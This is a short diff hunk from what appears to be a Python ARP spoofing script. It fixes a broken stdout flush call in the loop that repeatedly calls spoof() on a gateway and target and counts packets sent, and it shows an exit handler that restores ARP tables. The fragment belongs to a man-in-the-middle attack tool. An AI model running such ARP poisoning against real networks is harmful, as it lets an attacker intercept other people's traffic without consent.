@@ -37,7 +37,7 @@ try:
         spoof(gateway_ip, target_ip)
         sent_packets_count += 2
         print("\r[+] Packets sent: " + str(sent_packets_count)),
-        sys.stdoutput.flush
+        sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[+] User initiated exit command. \n[+] Restoring ARP Tables...")
